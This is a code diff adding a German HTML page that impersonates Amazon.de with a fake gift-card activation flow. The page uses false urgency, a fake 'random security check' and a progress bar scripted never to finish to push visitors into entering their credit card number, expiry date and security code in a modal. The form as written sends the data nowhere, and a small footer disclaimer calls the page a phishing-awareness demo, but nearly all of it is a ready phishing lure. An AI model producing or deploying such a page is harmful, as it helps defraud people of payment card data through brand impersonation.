@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon.de: Geschenkkarten-Aktivierung</title>
+    <link rel="icon" href="https://www.amazon.de/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #EAEDED;
+            color: #111;
+            line-height: 1.4;
+        }
+        
+        /* Header Styles */
+        .header {
+            background-color: #131921;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo {
+            margin-right: 10px;
+            padding-top: 5px;
+        }
+        
+        .logo img {
+            width: 100px;
+        }
+        
+        .search-bar {
+            flex-grow: 1;
+            display: flex;
+            max-width: 800px;
+            height: 40px;
+        }
+        
+        .search-dropdown {
+            background-color: #f3f3f3;
+            border: none;
+            border-radius: 4px 0 0 4px;
+            padding: 0 5px;
+            border-right: 1px solid #cdcdcd;
+            color: #555;
+            width: 55px;
+            font-size: 12px;
+        }
+        
+        .search-input {
+            flex-grow: 1;
+            padding: 8px;
+            border: none;
+            font-size: 15px;
+        }
+        
+        .search-button {
+            background-color: #febd69;
+            border: none;
+            width: 45px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+        }
+        
+        .search-button img {
+            width: 22px;
+            height: 22px;
+        }
+        
+        .nav-right {
+            display: flex;
+            align-items: center;
+            margin-left: 15px;
+        }
+        
+        .nav-item {
+            color: white;
+            margin: 0 10px;
+            font-size: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .nav-item-line1 {
+            font-size: 12px;
+            color: #ccc;
+        }
+        
+        .nav-item-line2 {
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .cart {
+            display: flex;
+            align-items: flex-end;
+        }
+        
+        .cart-icon {
+            font-size: 28px;
+            margin-right: 5px;
+        }
+        
+        .cart-count {
+            color: #f08804;
+            font-weight: bold;
+            position: relative;
+            top: -5px;
+            left: -10px;
+        }
+        
+        /* Navigation Bar */
+        .nav-belt {
+            background-color: #232f3e;
+            color: white;
+            padding: 5px 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-belt-item {
+            margin-right: 15px;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 5px 0;
+        }
+        
+        .hamburger {
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+        }
+        
+        .hamburger-icon {
+            margin-right: 5px;
+            font-size: 16px;
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+        
+        .breadcrumb {
+            font-size: 12px;
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .breadcrumb a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        
+        .breadcrumb a:hover {
+            color: #c45500;
+            text-decoration: underline;
+        }
+        
+        .main-content {
+            background-color: white;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .card-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #111;
+            font-weight: normal;
+        }
+        
+        .card-status {
+            background-color: #f8f8f8;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+        }
+        
+        .status-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #67a54b, #8bc34a);
+            border-radius: 10px;
+            width: 75%;
+            transition: width 1s;
+        }
+        
+        .status-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #555;
+        }
+        
+        .card-details {
+            display: flex;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 20px;
+        }
+        
+        .card-image {
+            width: 180px;
+            height: 100px;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            border: 1px solid #ddd;
+            padding: 5px;
+        }
+        
+        .card-image img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        
+        .card-info {
+            flex-grow: 1;
+        }
+        
+        .card-amount {
+            font-size: 21px;
+            font-weight: bold;
+            color: #B12704;
+            margin-bottom: 10px;
+        }
+        
+        .card-id {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        
+        .card-status-badge {
+            display: inline-block;
+            background-color: #FFF4E6;
+            color: #E77600;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-top: 5px;
+            border: 1px solid #FFE0B2;
+        }
+        
+        .verification-section {
+            padding-top: 10px;
+        }
+        
+        .verification-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #111;
+        }
+        
+        .verification-info {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .verification-steps {
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .step {
+            display: flex;
+            margin-bottom: 10px;
+            align-items: flex-start;
+        }
+        
+        .step-number {
+            background-color: #232f3e;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        
+        .step-content {
+            flex-grow: 1;
+        }
+        
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        
+        .step-description {
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .verification-button {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            padding: 8px 10px;
+            font-size: 14px;
+            cursor: pointer;
+            display: inline-block;
+            min-width: 180px;
+            text-align: center;
+        }
+        
+        .verification-button:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+        }
+        
+        .info-box {
+            background-color: #f3f3f3;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .info-box-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .info-box-content {
+            line-height: 1.5;
+        }
+        
+        /* Verification Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 4px;
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .modal-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #111;
+            font-weight: bold;
+        }
+        
+        .modal-text {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
+            font-size: 14px;
+        }
+        
+        .input-field:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
+            outline: none;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            justify-content: flex-end;
+        }
+        
+        .modal-button {
+            padding: 8px 15px;
+            border-radius: 3px;
+            font-size: 13px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        
+        .cancel-button {
+            background-color: #f1f1f1;
+            border: 1px solid #cdcdcd;
+        }
+        
+        .proceed-button {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #232f3e;
+            color: white;
+            padding: 30px 0;
+            margin-top: 30px;
+        }
+        
+        .footer-top {
+            background-color: #37475a;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        
+        .footer-top:hover {
+            background-color: #485769;
+        }
+        
+        .footer-links {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        
+        .footer-column {
+            width: 160px;
+        }
+        
+        .footer-column-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .footer-link {
+            display: block;
+            color: #ddd;
+            font-size: 12px;
+            margin-bottom: 8px;
+            text-decoration: none;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #3a4553;
+            font-size: 12px;
+            color: #ddd;
+        }
+        
+        .footer-logo {
+            margin-bottom: 10px;
+        }
+        
+        .footer-logo img {
+            width: 80px;
+        }
+        
+        .footer-countries {
+            margin: 10px 0;
+        }
+        
+        .footer-country {
+            color: #ddd;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer-country:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-copyright {
+            color: #999;
+            font-size: 11px;
+        }
+        
+        /* Verification Success */
+        .success-message {
+            display: none;
+            background-color: #f0f8eb;
+            border: 1px solid #7fad5a;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+            color: #2e8b57;
+        }
+        
+        .success-icon {
+            font-size: 24px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        .success-title {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        
+        .success-description {
+            font-size: 14px;
+        }
+        
+        .code-box {
+            background-color: #fff;
+            border: 1px dashed #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 18px;
+            letter-spacing: 2px;
+            font-family: monospace;
+            color: #111;
+        }
+        
+        .disclaimer {
+            font-size: 10px;
+            color: #999;
+            text-align: center;
+            margin-top: 10px;
+            padding: 5px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: rgba(255,255,255,0.8);
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <svg width="100" height="30" viewBox="0 0 602 182" xmlns="http://www.w3.org/2000/svg"><path d="M374.006 142.184c-35 25.797-85.729 39.561-129.406 39.561-61.242 0-116.376-22.651-158.087-60.325-3.278-2.962-.341-7 3.591-4.693 45.015 26.191 100.673 41.947 158.165 41.947 38.775 0 81.43-8.022 120.65-24.67 5.925-2.517 10.88 3.88 5.087 8.18M388.557 125.536c-4.457-5.715-29.573-2.7-40.846-1.363-3.434.42-3.959-2.57-.865-4.719 20.003-14.078 52.827-10.015 56.654-5.296 3.828 4.745-.996 37.647-19.793 53.351-2.884 2.412-5.637 1.127-4.352-2.071 4.22-10.539 13.685-34.16 9.202-39.902" fill="#FF9900"/><path d="M348.497 20.066V6.381c0-2.071 1.573-3.46 3.461-3.46h61.269c1.966 0 3.54 1.415 3.54 3.46v11.719c0 1.966-1.679 4.535-4.615 8.599l-31.749 45.329c11.798-.283 24.311 1.467 34.997 7.419 2.412 1.363 3.068 3.356 3.251 5.322V98.49c0 1.994-2.202 4.32-4.5 3.12-18.813-9.862-43.807-10.932-64.689.055-2.124 1.154-4.337-1.153-4.337-3.147V86.793c0-2.229.026-6.03 2.254-9.412l36.78-52.724h-32.026c-1.967 0-3.54-1.388-3.54-3.433l.004-1.158zM124.999 105.454h-18.64c-1.783-.13-3.199-1.468-3.33-3.172l.004-96.771c0-1.914 1.6-3.435 3.592-3.435h17.382c1.809.079 3.25 1.468 3.382 3.199v12.655h.34c4.536-12.086 13.056-17.722 24.54-17.722 11.666 0 18.954 5.636 24.198 17.722 4.509-12.086 14.76-17.722 25.744-17.722 7.813 0 16.36 3.225 21.577 10.461 5.899 8.049 4.693 19.741 4.693 29.992l-.026 60.377c0 1.914-1.6 3.461-3.592 3.461h-18.614c-1.862-.13-3.356-1.625-3.356-3.461V60.367c0-4.772.446-16.674-.629-21.183-1.678-7.6-6.686-9.723-13.183-9.723-5.428 0-11.09 3.619-13.393 9.41-2.308 5.794-2.095 15.464-2.095 21.496v41.617c0 1.914-1.6 3.461-3.592 3.461h-18.614c-1.888-.13-3.356-1.625-3.356-3.461V60.367c0-12.655 2.095-31.296-13.687-31.296-15.96 0-15.355 18.118-15.355 31.296v41.617c0 1.914-1.6 3.461-3.592 3.461M469.514 1.163c27.659 0 42.629 23.752 42.629 53.954 0 29.179-16.543 52.329-42.629 52.329-27.161 0-41.947-23.752-41.947-53.351 0-29.782 14.971-52.932 41.947-52.932m.159 19.531c-13.763 0-14.603 18.75-14.603 30.425 0 11.702-.278 36.485 14.444 36.485 14.446 0 15.12-20.118 15.12-32.382 0-8.075-.341-17.723-2.788-25.378-2.097-6.686-6.266-9.15-12.173-9.15M548.008 105.454h-18.562c-1.861-.13-3.356-1.625-3.356-3.461l-.026-96.771c.157-1.756 1.704-3.12 3.592-3.12h17.277c1.625.079 2.962 1.18 3.33 2.674v14.815h.34c5.217-13.083 12.532-19.322 25.404-19.322 8.363 0 16.517 3.015 21.76 11.273 4.876 7.655 4.876 20.528 4.876 29.782v60.22c-.21 1.678-1.757 3.015-3.592 3.015h-18.693c-1.704-.13-3.12-1.389-3.303-3.015V60.882c0-12.637 1.47-31.144-14.156-31.144-5.479 0-10.54 3.673-13.026 9.257-3.146 7.08-3.566 14.077-3.566 21.887v41.617c-.026 1.914-1.652 3.461-3.644 3.461M299.291 59.239c0 7.29.184 13.372-3.487 19.847-2.962 5.322-7.682 8.597-12.899 8.597-7.16 0-11.352-5.454-11.352-13.504 0-15.884 14.235-18.771 27.738-18.771v3.831zm18.798 45.434c-1.232 1.101-3.015 1.18-4.404.446-6.187-5.139-7.314-7.524-10.696-12.427-10.225 10.434-17.487 13.554-30.726 13.554-15.704 0-27.895-9.674-27.895-29.048 0-15.12 8.206-25.43 19.872-30.464 10.12-4.457 24.251-5.243 35.052-6.476v-2.412c0-4.43.341-9.673-2.254-13.502-2.281-3.435-6.633-4.85-10.46-4.85-7.106 0-13.447 3.644-14.997 11.195-.315 1.678-1.547 3.33-3.225 3.409l-18.09-1.94c-1.52-.341-3.225-1.573-2.778-3.906C252.26 18.196 270.443 8 286.695 8c8.39 0 19.347 2.228 25.957 8.57 8.39 7.786 7.575 18.179 7.575 29.48v26.644c0 8.023 3.33 11.56 6.476 15.886 1.101 1.547 1.339 3.41-.053 4.562-3.487 2.911-9.673 8.285-13.078 11.318l-.026-.026M54.924 59.239c0 7.29.183 13.372-3.487 19.847-2.963 5.322-7.655 8.597-12.9 8.597-7.158 0-11.325-5.454-11.325-13.504 0-15.884 14.236-18.771 27.712-18.771v3.831zM73.695 104.673c-1.232 1.101-3.015 1.18-4.404.446-6.187-5.139-7.287-7.524-10.696-12.427C48.37 103.126 41.108 106.246 27.87 106.246c-15.704 0-27.895-9.674-27.895-29.048 0-15.12 8.206-25.43 19.872-30.464 10.12-4.457 24.251-5.243 35.052-6.476v-2.412c0-4.43.341-9.673-2.254-13.502-2.281-3.435-6.633-4.85-10.46-4.85-7.106 0-13.447 3.644-14.997 11.195-.315 1.678-1.547 3.33-3.225 3.409l-18.09-1.94c-1.52-.341-3.225-1.573-2.778-3.906C7.176 18.196 25.358 8 41.61 8c8.39 0 19.347 2.228 25.957 8.57 8.39 7.786 7.575 18.179 7.575 29.48v26.644c0 8.023 3.33 11.56 6.476 15.886 1.101 1.547 1.339 3.41-.053 4.562-3.487 2.911-9.673 8.285-13.078 11.318l-.026-.026" fill="#FFFFFF"/></svg>
+        </div>
+        <div class="search-bar">
+            <select class="search-dropdown">
+                <option>Alle</option>
+            </select>
+            <input type="text" class="search-input" placeholder="Suchen auf Amazon.de">
+            <button class="search-button">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBkPSJNMTUuNSAxNGgtLjc5bC0uMjgtLjI3QzE1LjQxIDEyLjU5IDE2IDExLjExIDE2IDkuNSAxNiA1LjkxIDEzLjA5IDMgOS41IDNTMyA1LjkxIDMgOS41IDUuOTEgMTYgOS41IDE2YzEuNjEgMCAzLjA5LS41OSA0LjIzLTEuNTdsLjI3LjI4di43OWw1IDQuOTlMMjAuNDkgMTlsLTQuOTktNXptLTYgMEM3LjAxIDE0IDUgMTEuOTkgNSA5LjVTNy4wMSA1IDkuNSA1IDE0IDcuMDEgMTQgOS41IDExLjk5IDE0IDkuNSAxNHoiLz48L3N2Zz4=">
+            </button>
+        </div>
+        <div class="nav-right">
+            <div class="nav-item">
+                <div class="nav-item-line1">Hallo, Anmelden</div>
+                <div class="nav-item-line2">Konto & Listen</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-item-line1">Warenrücksendungen</div>
+                <div class="nav-item-line2">& Bestellungen</div>
+            </div>
+            <div class="nav-item cart">
+                <div class="cart-icon">🛒</div>
+                <div class="cart-count">0</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Navigation Bar -->
+    <div class="nav-belt">
+        <div class="nav-belt-item hamburger">
+            <span class="hamburger-icon">☰</span> Alle
+        </div>
+        <div class="nav-belt-item">Angebote</div>
+        <div class="nav-belt-item">Kundenservice</div>
+        <div class="nav-belt-item">Amazon Basics</div>
+        <div class="nav-belt-item">Bestseller</div>
+        <div class="nav-belt-item">Neuerscheinungen</div>
+        <div class="nav-belt-item">Prime</div>
+        <div class="nav-belt-item">Geschenkideen</div>
+        <div class="nav-belt-item">Elektronik & Foto</div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="#">Amazon.de</a> › <a href="#">Geschenkkarten</a> › <a href="#">Geschenkkarten-Aktivierung</a>
+        </div>
+        
+        <div class="main-content">
+
+            <h1 class="card-title">Amazon Geschenkkarte - Aktivierungsstatus</h1>
+            
+            <div class="card-status">
+                <div class="status-title">Aktivierungsprozess läuft...</div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+                <div class="status-info">
+                    <span>Gestartet</span>
+                    <span id="time-remaining">Verbleibende Zeit: 15 Minuten</span>
+                    <span>Abgeschlossen</span>
+                </div>
+            </div>
+            
+            <div class="card-details">
+                <div class="card-image">
+                    <img src="giftcard.png" alt="Amazon Geschenkkarte">
+                </div>
+                <div class="card-info">
+                    <div class="card-amount">500,00 € Geschenkkarte</div>
+                    <div class="card-id">Karten-ID: <span id="card-id">XXXX-XXXXXX-XXXX</span></div>
+                    <div class="card-id">Bestellt am: <span id="order-date">XX.XX.XXXX</span></div>
+                    <div class="card-status-badge">Aktivierung ausstehend</div>
+                </div>
+            </div>
+            
+            <div class="verification-section">
+                <h2 class="verification-title">Sicherheitsverifizierung erforderlich</h2>
+                <p class="verification-info">
+                    Um Ihre Amazon Geschenkkarte zu aktivieren, ist eine Sicherheitsverifizierung erforderlich. 
+                    Ihre Anfrage wurde für eine stichprobenartige Sicherheitsanalyse ausgewählt, was den Prozess verzögern kann.
+                    Dies dient dem Schutz vor Betrug und stellt sicher, dass die Karte dem rechtmäßigen Besitzer zugeordnet wird.
+                </p>
+                
+                <div class="verification-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <div class="step-title">Identitätsbestätigung</div>
+                            <div class="step-description">Bestätigen Sie Ihre Identität durch Eingabe Ihrer Zahlungsinformationen.</div>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <div class="step-title">Erweiterte Sicherheitsanalyse</div>
+                            <div class="step-description">Ihr Konto wurde für eine stichprobenartige Sicherheitsüberprüfung ausgewählt. Dies kann bis zu 24 Stunden dauern.</div>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <div class="step-title">Aktivierungsbestätigung</div>
+                            <div class="step-description">Nach erfolgreicher Verifizierung wird Ihre Karte aktiviert und ist einsatzbereit.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="verification-button" id="verify-button">Jetzt verifizieren</button>
+                
+                <div class="info-box">
+                    <div class="info-box-title">Wichtige Information</div>
+                    <div class="info-box-content">
+                        Die Aktivierung Ihrer Geschenkkarte muss innerhalb von 24 Stunden nach Erhalt abgeschlossen werden. 
+                        Da Ihr Konto für eine stichprobenartige Sicherheitsüberprüfung ausgewählt wurde, kann sich die Aktivierung verzögern.
+                        Bitte haben Sie Geduld während dieses Prozesses.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="success-message" id="success-message">
+                <div class="success-icon">⚠️</div>
+                <div class="success-title">Sicherheitsüberprüfung läuft</div>
+                <div class="success-description">
+                    Ihre Anfrage wurde für eine erweiterte Sicherheitsüberprüfung ausgewählt.
+                    Dieser Prozess kann bis zu 24 Stunden dauern. Wir werden Sie per E-Mail benachrichtigen,
+                    sobald die Überprüfung abgeschlossen ist.
+                </div>
+                <div class="code-box">
+                    Überprüfungs-ID: <span id="verification-id">XXXX-XXXX-XXXX</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Verification Modal -->
+    <div class="modal" id="verification-modal">
+        <div class="modal-content">
+            <div class="modal-title">Sicherheitsverifizierung</div>
+            <div class="modal-text">
+                Um Ihre Identität zu bestätigen und die Geschenkkarte zu aktivieren, geben Sie bitte Ihre Kreditkarteninformationen ein. 
+                Es wird keine Gebühr erhoben, die Daten dienen nur zur Verifizierung.
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">Karteninhaber</label>
+                <input type="text" class="input-field" placeholder="Name des Karteninhabers">
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">Kreditkartennummer</label>
+                <input type="text" class="input-field" placeholder="1234 5678 9012 3456">
+            </div>
+            
+            <div class="input-group" style="display: flex; gap: 10px;">
+                <div style="flex: 1;">
+                    <label class="input-label">Ablaufdatum</label>
+                    <input type="text" class="input-field" placeholder="MM/JJ">
+                </div>
+                <div style="flex: 1;">
+                    <label class="input-label">Sicherheitscode</label>
+                    <input type="text" class="input-field" placeholder="123">
+                </div>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-button cancel-button" id="cancel-button">Abbrechen</button>
+                <button class="modal-button proceed-button" id="proceed-button">Verifizieren</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-top">
+            Zurück zum Seitenanfang
+        </div>
+        
+        <div class="footer-links">
+            <div class="footer-column">
+                <div class="footer-column-title">Über Amazon</div>
+                <a href="#" class="footer-link">Karriere bei Amazon</a>
+                <a href="#" class="footer-link">Über Amazon</a>
+                <a href="#" class="footer-link">Nachhaltigkeit</a>
+                <a href="#" class="footer-link">Pressemitteilungen</a>
+                <a href="#" class="footer-link">Investor Relations</a>
+            </div>
+            
+            <div class="footer-column">
+                <div class="footer-column-title">Geld verdienen mit Amazon</div>
+                <a href="#" class="footer-link">Verkaufen bei Amazon</a>
+                <a href="#" class="footer-link">Verkaufen bei Amazon Business</a>
+                <a href="#" class="footer-link">Partnerprogramm</a>
+                <a href="#" class="footer-link">Fulfillment by Amazon</a>
+            </div>
+            
+            <div class="footer-column">
+                <div class="footer-column-title">Amazon Zahlungsarten</div>
+                <a href="#" class="footer-link">Amazon.de VISA Karte</a>
+                <a href="#" class="footer-link">Gutscheine</a>
+                <a href="#" class="footer-link">Rechnung</a>
+                <a href="#" class="footer-link">Bankeinzug</a>
+            </div>
+            
+            <div class="footer-column">
+                <div class="footer-column-title">Wir helfen Ihnen</div>
+                <a href="#" class="footer-link">Lieferung verfolgen</a>
+                <a href="#" class="footer-link">Rückgabe & Ersatz</a>
+                <a href="#" class="footer-link">Amazon App</a>
+                <a href="#" class="footer-link">Kundenservice</a>
+                <a href="#" class="footer-link">Barrierefreiheit</a>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <div class="footer-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/175px-Amazon_logo.svg.png" width="80" alt="Amazon Logo">
+            </div>
+            
+            <div class="footer-countries">
+                <a href="#" class="footer-country">Deutschland</a>
+                <a href="#" class="footer-country">Frankreich</a>
+                <a href="#" class="footer-country">Italien</a>
+                <a href="#" class="footer-country">Spanien</a>
+                <a href="#" class="footer-country">Niederlande</a>
+                <a href="#" class="footer-country">Vereinigtes Königreich</a>
+            </div>
+            
+            <div class="footer-copyright">
+                © 1998-2023, Amazon.com, Inc. oder Tochtergesellschaften
+            </div>
+        </div>
+    </div>
+    
+    <div class="disclaimer">
+        Diese Seite dient ausschließlich zu Bildungszwecken, um auf Phishing-Gefahren aufmerksam zu machen. Geben Sie niemals Ihre persönlichen Daten auf verdächtigen Webseiten ein.
+    </div>
+    
+    <script>
+        // Generate random card ID and date
+        window.onload = function() {
+            // Random card ID
+            const randomCardId = () => {
+                let id = "";
+                for (let i = 0; i < 4; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                id += "-";
+                for (let i = 0; i < 6; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                id += "-";
+                for (let i = 0; i < 4; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                return id;
+            };
+            
+            // Random verification ID
+            const randomVerificationId = () => {
+                let id = "";
+                for (let i = 0; i < 4; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                id += "-";
+                for (let i = 0; i < 4; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                id += "-";
+                for (let i = 0; i < 4; i++) {
+                    id += Math.floor(Math.random() * 10);
+                }
+                return id;
+            };
+            
+            // Random date in the last 7 days
+            const randomDate = () => {
+                const today = new Date();
+                const daysAgo = Math.floor(Math.random() * 7);
+                const date = new Date(today.getTime() - daysAgo * 24 * 60 * 60 * 1000);
+                return date.toLocaleDateString('de-DE');
+            };
+            
+            document.getElementById('card-id').textContent = randomCardId();
+            document.getElementById('order-date').textContent = randomDate();
+            
+            if (document.getElementById('verification-id')) {
+                document.getElementById('verification-id').textContent = randomVerificationId();
+            }
+            
+            // Progress bar animation - will never reach 100%
+            const progressBar = document.getElementById('progress-bar');
+            let width = 75;
+            const interval = setInterval(() => {
+                if (width >= 92) {
+                    // Stop at 92% to indicate it's never fully completing
+                    clearInterval(interval);
+                    document.getElementById('time-remaining').textContent = "Erweiterte Sicherheitsanalyse läuft...";
+                } else {
+                    width += 0.2;  // Very slow progress
+                    progressBar.style.width = width + '%';
+                }
+            }, 1000);
+            
+            // Update remaining time - will never reach zero
+            let minutes = 15;
+            let seconds = 0;
+            const timeInterval = setInterval(() => {
+                if (minutes <= 5) {
+                    // When reaching 5 minutes, change the message
+                    clearInterval(timeInterval);
+                    document.getElementById('time-remaining').textContent = "Stichprobenartige Sicherheitsanalyse läuft...";
+                } else {
+                    if (seconds === 0) {
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        seconds--;
+                    }
+                    document.getElementById('time-remaining').textContent = `Verbleibende Zeit: ${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+                }
+            }, 1000);
+            
+            // Verification button
+            document.getElementById('verify-button').addEventListener('click', function() {
+                document.getElementById('verification-modal').style.display = 'flex';
+            });
+            
+            // Cancel button
+            document.getElementById('cancel-button').addEventListener('click', function() {
+                document.getElementById('verification-modal').style.display = 'none';
+            });
+            
+            // Proceed button
+            document.getElementById('proceed-button').addEventListener('click', function() {
+                document.getElementById('verification-modal').style.display = 'none';
+                
+                // Show processing but never complete
+                progressBar.style.width = '92%';
+                document.getElementById('time-remaining').textContent = "Stichprobenartige Sicherheitsanalyse läuft...";
+                
+                // Show pending message after 2 seconds
+                setTimeout(() => {
+                    document.getElementById('success-message').style.display = 'block';
+                    document.querySelector('.card-status-badge').textContent = "Sicherheitsüberprüfung";
+                    document.querySelector('.card-status-badge').style.backgroundColor = "#FFF4E6";
+                    document.querySelector('.card-status-badge').style.color = "#E77600";
+                    document.querySelector('.card-status-badge').style.borderColor = "#FFE0B2";
+                    document.querySelector('.status-title').textContent = "Erweiterte Sicherheitsanalyse läuft...";
+                }, 2000);
+            });
+        };
+    </script>
+</body>
+</html>
